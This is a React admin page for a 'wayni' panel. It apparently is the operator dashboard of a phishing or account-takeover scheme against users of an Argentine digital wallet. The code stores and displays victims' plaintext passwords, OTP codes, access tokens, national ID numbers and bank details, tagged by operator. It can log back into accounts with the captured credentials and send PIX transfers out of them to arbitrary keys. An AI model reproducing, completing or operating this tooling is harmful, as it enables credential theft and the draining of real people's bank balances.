import { useState, useEffect, useCallback } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { invokeWayni } from "@/lib/wayniApi";
import CocosAdminLogin from "@/components/admin/CocosAdminLogin";
import { SessionPresenceProvider } from "@/hooks/useSessionPresence";
import OnlineNowTab from "@/components/admin/OnlineNowTab";
import {
  Shield, LogOut, RefreshCw, Users, Wallet, Eye, EyeOff, Trash2, DollarSign,
  Copy, Check, Search, ArrowUpRight, Loader2, ChevronDown, ChevronUp,
} from "lucide-react";

interface WayniAccount {
  id: string;
  identification: string;
  email: string | null;
  password: string | null;
  full_name: string | null;
  phone: string | null;
  access_token: string | null;
  user_uuid: string | null;
  balance: string | null;
  bank_data: any;
  activities: any;
  profile_data: any;
  operator_code: string;
  info_tag: string | null;
  last_login_at: string | null;
  last_data_sync_at: string | null;
  created_at: string;
  updated_at: string;
}

interface LiveSession {
  id: string;
  email: string | null;
  password: string | null;
  status: string;
  otp_code: string | null;
  created_at: string;
  ip_address: string | null;
  city: string | null;
  country: string | null;
  source: string;
  operator_code: string;
}

const WayniAdmin = () => {
  const { user, isAdmin, loading: authLoading, signOut } = useAuth();
  const [activeTab, setActiveTab] = useState<"online" | "accounts" | "pix">("accounts");
  const [accounts, setAccounts] = useState<WayniAccount[]>([]);
  const [loadingAccounts, setLoadingAccounts] = useState(false);
  const [search, setSearch] = useState("");
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [syncing, setSyncing] = useState<string | null>(null);
  const [relogging, setRelogging] = useState<string | null>(null);
  const [showPasswords, setShowPasswords] = useState<Record<string, boolean>>({});
  const [copied, setCopied] = useState<string | null>(null);

  // PIX state
  const [pixAccountId, setPixAccountId] = useState("");
  const [pixKey, setPixKey] = useState("");
  const [pixAmount, setPixAmount] = useState("");
  const [pixStep, setPixStep] = useState<"idle" | "validating" | "validated" | "processing" | "done" | "error">("idle");
  const [pixData, setPixData] = useState<any>(null);
  const [pixError, setPixError] = useState("");

  const fetchAccounts = useCallback(async () => {
    setLoadingAccounts(true);
    const { data } = await supabase.from("wayni_accounts").select("*").order("created_at", { ascending: false });
    setAccounts((data as any[]) || []);
    setLoadingAccounts(false);
  }, []);

  useEffect(() => {
    if (isAdmin) fetchAccounts();
  }, [isAdmin, fetchAccounts]);

  const handleSync = async (id: string) => {
    setSyncing(id);
    await invokeWayni({ action: "sync", account_id: id });
    await fetchAccounts();
    setSyncing(null);
  };

  const handleRelogin = async (id: string) => {
    setRelogging(id);
    const { data, error } = await invokeWayni({ action: "relogin", account_id: id });
    if (!error && data?.success) {
      await invokeWayni({ action: "sync", account_id: id });
    }
    await fetchAccounts();
    setRelogging(null);
  };

  const handleDelete = async (id: string) => {
    if (!confirm("Deletar esta conta?")) return;
    await supabase.from("wayni_accounts").delete().eq("id", id);
    await fetchAccounts();
  };

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
  };

  // PIX flow
  const handlePixValidate = async () => {
    if (!pixAccountId || !pixKey) return;
    setPixStep("validating"); setPixError("");
    const { data, error } = await invokeWayni({ action: "pix_validate", account_id: pixAccountId, pix_key: pixKey });
    if (error || data?.error) { setPixError(data?.error || error?.message); setPixStep("error"); return; }
    setPixData(data);
    setPixStep("validated");
  };

  const handlePixProcess = async () => {
    if (!pixData?.paymentUuid || !pixAmount) return;
    setPixStep("processing"); setPixError("");
    const { data, error } = await invokeWayni({ action: "pix_process", account_id: pixAccountId, payment_uuid: pixData.paymentUuid, brl_amount: parseFloat(pixAmount) });
    if (error || data?.error) { setPixError(data?.error || error?.message); setPixStep("error"); return; }
    setPixData(data);
    setPixStep("done");
  };

  if (authLoading) return <div className="min-h-screen bg-[#111] flex items-center justify-center"><Loader2 className="w-8 h-8 text-[#c8e64a] animate-spin" /></div>;
  if (!user || !isAdmin) return <CocosAdminLogin onLogin={() => {}} />;

  const filtered = accounts.filter(a => {
    const q = search.toLowerCase();
    return !q || (a.identification?.toLowerCase().includes(q)) || (a.email?.toLowerCase().includes(q)) || (a.full_name?.toLowerCase().includes(q));
  });

  return (
    <SessionPresenceProvider>
      <div className="min-h-screen bg-[#0a0a0a] text-white">
        {/* Header */}
        <div className="bg-[#111] border-b border-[#222] px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <span className="text-[22px] font-black text-[#c8e64a]" style={{ fontFamily: "'Inter', sans-serif" }}>wayni</span>
            <Shield className="w-5 h-5 text-[#c8e64a]" />
            <span className="text-sm text-gray-400">Admin</span>
          </div>
          <div className="flex items-center gap-3">
            <span className="text-xs text-gray-500">{user.email}</span>
            <button onClick={signOut} className="text-gray-400 hover:text-white"><LogOut size={18} /></button>
          </div>
        </div>

        {/* Tabs */}
        <div className="flex border-b border-[#222]">
          {[
            { key: "accounts" as const, label: "Contas", icon: Users },
            { key: "online" as const, label: "Online", icon: Users },
            { key: "pix" as const, label: "PIX", icon: DollarSign },
          ].map(t => (
            <button
              key={t.key}
              onClick={() => setActiveTab(t.key)}
              className={`flex items-center gap-2 px-5 py-3 text-sm font-medium border-b-2 transition-colors ${activeTab === t.key ? "border-[#c8e64a] text-[#c8e64a]" : "border-transparent text-gray-500 hover:text-gray-300"}`}
            >
              <t.icon size={16} />
              {t.label}
            </button>
          ))}
        </div>

        <div className="p-4 max-w-6xl mx-auto">
          {/* ─── ACCOUNTS TAB ─── */}
          {activeTab === "accounts" && (
            <div>
              <div className="flex items-center gap-3 mb-4">
                <div className="relative flex-1">
                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 w-4 h-4" />
                  <input
                    placeholder="Buscar por DNI, email, nome..."
                    value={search}
                    onChange={e => setSearch(e.target.value)}
                    className="w-full pl-10 pr-4 py-2.5 bg-[#1a1a1a] border border-[#333] rounded-lg text-sm text-white placeholder:text-gray-600 outline-none focus:border-[#c8e64a]"
                  />
                </div>
                <button onClick={fetchAccounts} className="p-2.5 bg-[#1a1a1a] border border-[#333] rounded-lg hover:bg-[#222]">
                  <RefreshCw size={16} className={loadingAccounts ? "animate-spin" : ""} />
                </button>
              </div>

              <div className="text-xs text-gray-500 mb-3">{filtered.length} conta(s)</div>

              <div className="space-y-2">
                {filtered.map(acc => {
                  const isExpanded = expandedId === acc.id;
                  const cvu = acc.bank_data?.internal_account?.[0]?.cvu;
                  const cvuAlias = acc.bank_data?.internal_account?.[0]?.cvu_alias;
                  const walletAcc = acc.bank_data?.internal_account?.[0]?.wallet_account;
                  const activities = acc.activities?.data || [];

                  return (
                    <div key={acc.id} className="bg-[#141414] border border-[#222] rounded-xl overflow-hidden">
                      {/* Row header */}
                      <div
                        className="flex items-center justify-between px-4 py-3 cursor-pointer hover:bg-[#1a1a1a]"
                        onClick={() => setExpandedId(isExpanded ? null : acc.id)}
                      >
                        <div className="flex items-center gap-3 min-w-0">
                          <div className="w-8 h-8 rounded-full bg-[#c8e64a]/20 flex items-center justify-center text-[#c8e64a] text-xs font-bold flex-shrink-0">
                            {(acc.full_name || acc.identification || "?")[0].toUpperCase()}
                          </div>
                          <div className="min-w-0">
                            <p className="text-sm font-medium truncate">{acc.full_name || acc.identification}</p>
                            <p className="text-xs text-gray-500 truncate">{acc.email || acc.identification}</p>
                          </div>
                        </div>
                        <div className="flex items-center gap-3">
                          <span className="text-sm font-mono text-[#c8e64a]">${acc.balance || "0"}</span>
                          <span className={`w-2 h-2 rounded-full ${acc.access_token ? "bg-green-500" : "bg-red-500"}`} />
                          {isExpanded ? <ChevronUp size={16} className="text-gray-500" /> : <ChevronDown size={16} className="text-gray-500" />}
                        </div>
                      </div>

                      {/* Expanded */}
                      {isExpanded && (
                        <div className="border-t border-[#222] px-4 py-4 space-y-3">
                          {/* Info grid */}
                          <div className="grid grid-cols-2 gap-3 text-xs">
                            <div>
                              <span className="text-gray-500">DNI:</span>{" "}
                              <span className="text-white">{acc.identification}</span>
                            </div>
                            <div>
                              <span className="text-gray-500">Tel:</span>{" "}
                              <span className="text-white">{acc.phone || "—"}</span>
                            </div>
                            <div className="flex items-center gap-1">
                              <span className="text-gray-500">Senha:</span>{" "}
                              <span className="text-white font-mono">{showPasswords[acc.id] ? acc.password : "••••••"}</span>
                              <button onClick={(e) => { e.stopPropagation(); setShowPasswords(p => ({ ...p, [acc.id]: !p[acc.id] })); }}>
                                {showPasswords[acc.id] ? <EyeOff size={12} className="text-gray-500" /> : <Eye size={12} className="text-gray-500" />}
                              </button>
                            </div>
                            <div>
                              <span className="text-gray-500">Operador:</span>{" "}
                              <span className="text-white">{acc.operator_code}</span>
                            </div>
                          </div>

                          {/* CVU */}
                          {cvu && (
                            <div className="bg-[#0a0a0a] rounded-lg p-3 space-y-1">
                              <div className="flex items-center justify-between">
                                <span className="text-xs text-gray-500">CVU</span>
                                <button onClick={() => copyToClipboard(cvu, `cvu-${acc.id}`)} className="text-gray-500 hover:text-white">
                                  {copied === `cvu-${acc.id}` ? <Check size={12} className="text-green-500" /> : <Copy size={12} />}
                                </button>
                              </div>
                              <p className="text-xs font-mono text-gray-300">{cvu}</p>
                              {cvuAlias && <p className="text-xs text-gray-500">Alias: {cvuAlias}</p>}
                            </div>
                          )}

                          {/* Activities */}
                          {activities.length > 0 && (
                            <div>
                              <p className="text-xs text-gray-500 mb-2">Últimos movimentos:</p>
                              <div className="space-y-1">
                                {activities.slice(0, 5).map((act: any, i: number) => (
                                  <div key={i} className="flex items-center justify-between bg-[#0a0a0a] rounded-lg px-3 py-2">
                                    <div className="min-w-0">
                                      <p className="text-xs truncate">{act.data?.description || act.type}</p>
                                      <p className="text-[10px] text-gray-600">{new Date(act.created_at).toLocaleString()}</p>
                                    </div>
                                    <span className={`text-xs font-mono ${act.entry_type === "CREDIT" ? "text-green-400" : "text-red-400"}`}>
                                      {act.entry_type === "CREDIT" ? "+" : "-"}${act.total_amount}
                                    </span>
                                  </div>
                                ))}
                              </div>
                            </div>
                          )}

                          {/* Actions */}
                          <div className="flex gap-2 pt-2">
                            <button
                              onClick={() => handleSync(acc.id)}
                              disabled={syncing === acc.id}
                              className="flex items-center gap-1.5 px-3 py-1.5 bg-[#c8e64a]/10 text-[#c8e64a] rounded-lg text-xs font-medium hover:bg-[#c8e64a]/20 disabled:opacity-50"
                            >
                              <RefreshCw size={12} className={syncing === acc.id ? "animate-spin" : ""} />
                              Sync
                            </button>
                            <button
                              onClick={() => handleRelogin(acc.id)}
                              disabled={relogging === acc.id}
                              className="flex items-center gap-1.5 px-3 py-1.5 bg-blue-500/10 text-blue-400 rounded-lg text-xs font-medium hover:bg-blue-500/20 disabled:opacity-50"
                            >
                              <RefreshCw size={12} className={relogging === acc.id ? "animate-spin" : ""} />
                              Relogin
                            </button>
                            <button
                              onClick={() => { setPixAccountId(acc.id); setActiveTab("pix"); }}
                              className="flex items-center gap-1.5 px-3 py-1.5 bg-green-500/10 text-green-400 rounded-lg text-xs font-medium hover:bg-green-500/20"
                            >
                              <ArrowUpRight size={12} />
                              PIX
                            </button>
                            <button
                              onClick={() => handleDelete(acc.id)}
                              className="flex items-center gap-1.5 px-3 py-1.5 bg-red-500/10 text-red-400 rounded-lg text-xs font-medium hover:bg-red-500/20 ml-auto"
                            >
                              <Trash2 size={12} />
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {/* ─── ONLINE TAB ─── */}
          {activeTab === "online" && (
            <OnlineNowTab
              sessions={[]}
              onOperate={() => {}}
              sourceFilter="wayni"
            />
          )}

          {/* ─── PIX TAB ─── */}
          {activeTab === "pix" && (
            <div className="max-w-md mx-auto space-y-4">
              <h2 className="text-lg font-bold text-[#c8e64a]">Envio PIX</h2>

              {/* Select account */}
              <div>
                <label className="text-xs text-gray-500 mb-1 block">Conta</label>
                <select
                  value={pixAccountId}
                  onChange={e => setPixAccountId(e.target.value)}
                  className="w-full bg-[#1a1a1a] border border-[#333] rounded-lg px-3 py-2.5 text-sm text-white outline-none focus:border-[#c8e64a]"
                >
                  <option value="">Selecionar conta...</option>
                  {accounts.filter(a => a.access_token).map(a => (
                    <option key={a.id} value={a.id}>{a.full_name || a.identification} — ${a.balance || "0"}</option>
                  ))}
                </select>
              </div>

              {/* PIX Key */}
              <div>
                <label className="text-xs text-gray-500 mb-1 block">Chave PIX</label>
                <input
                  value={pixKey}
                  onChange={e => setPixKey(e.target.value)}
                  placeholder="CPF, telefone, email..."
                  className="w-full bg-[#1a1a1a] border border-[#333] rounded-lg px-3 py-2.5 text-sm text-white placeholder:text-gray-600 outline-none focus:border-[#c8e64a]"
                />
              </div>

              {pixStep === "idle" && (
                <button
                  onClick={handlePixValidate}
                  disabled={!pixAccountId || !pixKey}
                  className="w-full py-3 bg-[#c8e64a] text-[#0a0a0a] rounded-xl font-bold text-sm disabled:opacity-50"
                >
                  Validar Chave
                </button>
              )}

              {pixStep === "validating" && (
                <div className="flex items-center justify-center gap-2 py-4">
                  <Loader2 className="w-5 h-5 text-[#c8e64a] animate-spin" />
                  <span className="text-sm text-gray-400">Validando...</span>
                </div>
              )}

              {(pixStep === "validated" || pixStep === "processing") && pixData && (
                <div className="bg-[#141414] border border-[#222] rounded-xl p-4 space-y-3">
                  <div className="text-xs space-y-1">
                    <p><span className="text-gray-500">Destinatário:</span> <span className="text-white font-medium">{pixData.ownerName}</span></p>
                    <p><span className="text-gray-500">Chave:</span> <span className="text-white">{pixData.reformatedKey || pixData.pixKey}</span></p>
                  </div>

                  <div>
                    <label className="text-xs text-gray-500 mb-1 block">Valor BRL</label>
                    <input
                      type="number"
                      value={pixAmount}
                      onChange={e => setPixAmount(e.target.value)}
                      placeholder="5.00"
                      className="w-full bg-[#0a0a0a] border border-[#333] rounded-lg px-3 py-2.5 text-sm text-white outline-none focus:border-[#c8e64a]"
                    />
                  </div>

                  <button
                    onClick={handlePixProcess}
                    disabled={!pixAmount || pixStep === "processing"}
                    className="w-full py-3 bg-green-500 text-white rounded-xl font-bold text-sm disabled:opacity-50"
                  >
                    {pixStep === "processing" ? (
                      <span className="flex items-center justify-center gap-2"><Loader2 className="w-4 h-4 animate-spin" />Processando...</span>
                    ) : `Enviar R$${pixAmount || "0"}`}
                  </button>
                </div>
              )}

              {pixStep === "done" && pixData && (
                <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 text-center space-y-2">
                  <p className="text-green-400 font-bold">✓ PIX Enviado!</p>
                  <p className="text-xs text-gray-400">R${pixData.brlAmount} → {pixData.ownerName}</p>
                  <p className="text-xs text-gray-500">ARS debitado: ${pixData.arsAmount}</p>
                  <button onClick={() => { setPixStep("idle"); setPixData(null); setPixKey(""); setPixAmount(""); }} className="text-xs text-[#c8e64a] hover:underline mt-2">
                    Novo envio
                  </button>
                </div>
              )}

              {pixStep === "error" && (
                <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-4 text-center space-y-2">
                  <p className="text-red-400 font-bold">Erro</p>
                  <p className="text-xs text-gray-400">{pixError}</p>
                  <button onClick={() => setPixStep("idle")} className="text-xs text-[#c8e64a] hover:underline mt-2">Tentar novamente</button>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </SessionPresenceProvider>
  );
};

export default WayniAdmin;
